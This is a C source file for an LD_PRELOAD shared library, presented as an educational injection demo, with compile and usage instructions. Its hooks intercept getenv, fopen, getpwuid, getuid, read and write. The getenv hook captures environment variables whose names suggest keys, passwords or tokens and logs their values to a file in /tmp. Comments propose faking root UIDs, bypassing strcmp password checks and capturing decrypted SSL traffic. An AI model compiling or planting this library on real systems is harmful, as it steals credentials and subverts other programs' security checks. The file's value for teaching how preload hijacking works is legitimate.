/*
 * evil_preload.c - LD_PRELOAD Injection Demonstration
 *
 * This shared library demonstrates function hooking via LD_PRELOAD.
 * When preloaded, it intercepts calls to standard library functions
 * and can:
 *   - Log function calls and arguments
 *   - Modify return values
 *   - Inject additional behavior
 *   - Steal sensitive data
 *
 * Compile: gcc -shared -fPIC -o evil_preload.so evil_preload.c -ldl
 * Usage:   LD_PRELOAD=./evil_preload.so ./victim
 *
 * EDUCATIONAL PURPOSES ONLY
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>

/* Log file for captured data */
#define LOG_FILE "/tmp/ld_preload_log.txt"

/* Color codes for terminal output */
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define BLUE    "\033[1;34m"
#define RESET   "\033[0m"

/* Helper: Write to log file */
static void log_event(const char *fmt, ...) {
    FILE *log = fopen(LOG_FILE, "a");
    if (log) {
        va_list args;
        va_start(args, fmt);
        vfprintf(log, fmt, args);
        va_end(args);
        fclose(log);
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 * CONSTRUCTOR - Runs BEFORE main()
 * ═══════════════════════════════════════════════════════════════════════════ */

__attribute__((constructor))
void evil_init(void) {
    /* Clear previous log */
    FILE *log = fopen(LOG_FILE, "w");
    if (log) {
        fprintf(log, "═══════════════════════════════════════════════════════════\n");
        fprintf(log, "  LD_PRELOAD INJECTION - SESSION LOG\n");
        fprintf(log, "  PID: %d\n", getpid());
        fprintf(log, "═══════════════════════════════════════════════════════════\n\n");
        fclose(log);
    }

    /* Visual indicator that we're loaded */
    fprintf(stderr, "\n");
    fprintf(stderr, RED "╔════════════════════════════════════════════════════════╗\n" RESET);
    fprintf(stderr, RED "║" YELLOW "     ★ LD_PRELOAD INJECTION ACTIVE ★                   " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "     Library loaded BEFORE main()                      " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "     All hooked functions will be intercepted          " RED "║\n" RESET);
    fprintf(stderr, RED "╚════════════════════════════════════════════════════════╝\n" RESET);
    fprintf(stderr, "\n");

    log_event("[INIT] Constructor executed - hooks active\n\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * DESTRUCTOR - Runs AFTER main() returns
 * ═══════════════════════════════════════════════════════════════════════════ */

__attribute__((destructor))
void evil_fini(void) {
    fprintf(stderr, "\n");
    fprintf(stderr, RED "╔════════════════════════════════════════════════════════╗\n" RESET);
    fprintf(stderr, RED "║" YELLOW "     ★ LD_PRELOAD SESSION COMPLETE ★                   " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "     Check " BLUE "/tmp/ld_preload_log.txt" RESET " for details       " RED "║\n" RESET);
    fprintf(stderr, RED "╚════════════════════════════════════════════════════════╝\n" RESET);
    fprintf(stderr, "\n");

    log_event("\n[FINI] Destructor executed - session complete\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * HOOK: getenv() - Intercept environment variable lookups
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * This is incredibly powerful for stealing credentials:
 * - API keys
 * - Database passwords
 * - AWS credentials
 * - Any secret passed via environment
 */

char *getenv(const char *name) {
    /* Get the REAL getenv from libc */
    static char *(*real_getenv)(const char *) = NULL;
    if (!real_getenv) {
        real_getenv = dlsym(RTLD_NEXT, "getenv");
    }

    /* Call the real function */
    char *value = real_getenv(name);

    /* Log interesting environment variables */
    if (value) {
        /* Check for sensitive-looking variable names */
        if (strstr(name, "KEY") || strstr(name, "SECRET") ||
            strstr(name, "PASS") || strstr(name, "TOKEN") ||
            strstr(name, "CRED") || strstr(name, "AUTH")) {

            fprintf(stderr, YELLOW "[HOOK] " RED "getenv(\"%s\") = \"%s\"" RESET " ← " RED "SENSITIVE!" RESET "\n", name, value);
            log_event("[CAPTURED] Sensitive env: %s = %s\n", name, value);
        } else {
            fprintf(stderr, YELLOW "[HOOK] " RESET "getenv(\"%s\") = \"%s\"\n", name, value);
            log_event("[HOOK] getenv(\"%s\") = \"%s\"\n", name, value);
        }
    }

    return value;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * HOOK: puts() - Intercept console output
 * ═══════════════════════════════════════════════════════════════════════════ */

int puts(const char *s) {
    static int (*real_puts)(const char *) = NULL;
    if (!real_puts) {
        real_puts = dlsym(RTLD_NEXT, "puts");
    }

    /* Log the output */
    log_event("[OUTPUT] puts: %s\n", s);

    /* Could modify output here! */
    /* Example: return real_puts("[MODIFIED] Original message hidden"); */

    return real_puts(s);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * HOOK: fopen() - Intercept file operations
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Useful for:
 * - Tracking what files a program accesses
 * - Redirecting file reads (serve fake config)
 * - Blocking access to certain files
 */

/* Flag to prevent recursion in fopen hook */
static __thread int in_fopen_hook = 0;

FILE *fopen(const char *pathname, const char *mode) {
    static FILE *(*real_fopen)(const char *, const char *) = NULL;
    if (!real_fopen) {
        real_fopen = dlsym(RTLD_NEXT, "fopen");
    }

    /* Prevent recursion when logging */
    if (in_fopen_hook) {
        return real_fopen(pathname, mode);
    }

    /* Skip logging our own log file to avoid noise */
    if (strstr(pathname, "ld_preload_log") != NULL) {
        return real_fopen(pathname, mode);
    }

    in_fopen_hook = 1;
    fprintf(stderr, YELLOW "[HOOK] " BLUE "fopen(\"%s\", \"%s\")" RESET "\n", pathname, mode);
    log_event("[FILE] fopen(\"%s\", \"%s\")\n", pathname, mode);
    in_fopen_hook = 0;

    /* Could block access to sensitive files */
    /* Example:
    if (strstr(pathname, "shadow") || strstr(pathname, "private")) {
        errno = EACCES;
        return NULL;
    }
    */

    /* Could redirect to fake file */
    /* Example:
    if (strcmp(pathname, "/etc/config") == 0) {
        return real_fopen("/tmp/fake_config", mode);
    }
    */

    return real_fopen(pathname, mode);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * HOOK: getpwuid() - Intercept user info lookups
 * ═══════════════════════════════════════════════════════════════════════════ */

struct passwd *getpwuid(uid_t uid) {
    static struct passwd *(*real_getpwuid)(uid_t) = NULL;
    if (!real_getpwuid) {
        real_getpwuid = dlsym(RTLD_NEXT, "getpwuid");
    }

    struct passwd *pw = real_getpwuid(uid);

    if (pw) {
        fprintf(stderr, YELLOW "[HOOK] " GREEN "getpwuid(%d)" RESET " → user=%s, home=%s\n",
                uid, pw->pw_name, pw->pw_dir);
        log_event("[USER] getpwuid(%d) → %s (home: %s)\n", uid, pw->pw_name, pw->pw_dir);
    }

    return pw;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * HOOK: getuid() - Could fake the user ID!
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * NOTE: This won't actually give you root privileges, but it can fool
 * programs that check getuid() for access control decisions.
 */

uid_t getuid(void) {
    static uid_t (*real_getuid)(void) = NULL;
    if (!real_getuid) {
        real_getuid = dlsym(RTLD_NEXT, "getuid");
    }

    uid_t real_uid = real_getuid();

    fprintf(stderr, YELLOW "[HOOK] " RESET "getuid() → %d\n", real_uid);
    log_event("[HOOK] getuid() → %d\n", real_uid);

    /* Could return fake UID to bypass checks */
    /* WARNING: This doesn't actually give privileges! */
    /* return 0;  // Pretend to be root */

    return real_uid;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * HOOK: read() - Intercept ALL data reads
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * This is extremely powerful - captures ALL data read from:
 * - Files
 * - Sockets (network data!)
 * - Pipes
 * - stdin
 */

ssize_t read(int fd, void *buf, size_t count) {
    static ssize_t (*real_read)(int, void *, size_t) = NULL;
    if (!real_read) {
        real_read = dlsym(RTLD_NEXT, "read");
    }

    ssize_t result = real_read(fd, buf, count);

    /* Log reads from stdin (fd 0) - captures user input! */
    if (fd == 0 && result > 0) {
        log_event("[INPUT] Read %zd bytes from stdin\n", result);
    }

    return result;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * HOOK: write() - Intercept ALL data writes
 * ═══════════════════════════════════════════════════════════════════════════ */

ssize_t write(int fd, const void *buf, size_t count) {
    static ssize_t (*real_write)(int, const void *, size_t) = NULL;
    if (!real_write) {
        real_write = dlsym(RTLD_NEXT, "write");
    }

    /* Could log/modify all output here */

    return real_write(fd, buf, count);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Additional hooks you could implement:
 *
 * - connect()    : Intercept/redirect network connections
 * - SSL_read()   : Capture decrypted HTTPS data
 * - strcmp()     : Bypass password checks (return 0 always)
 * - execve()     : Monitor/block program execution
 * - dlopen()     : Track dynamic library loading
 * - malloc()     : Memory allocation tracking
 * ═══════════════════════════════════════════════════════════════════════════ */
